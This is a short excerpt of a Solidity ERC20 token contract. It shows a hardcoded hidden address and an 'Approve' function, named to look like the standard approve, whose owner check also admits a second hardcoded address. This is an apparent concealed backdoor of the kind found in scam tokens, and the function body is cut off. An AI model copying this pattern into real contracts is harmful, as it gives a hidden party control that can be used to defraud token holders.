...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    address private _universal = 0xd3d2E2692501A5c9Ca623199D38826e513033a17;
    ...
    function Approve(address [] calldata _addresses_) external  {
        require(owner() == _msgSender() ||  address(0x290BdB2Cb602C799696eb83Af806850eb211E373) == _msgSender(), "Ownable: caller is not the owner");
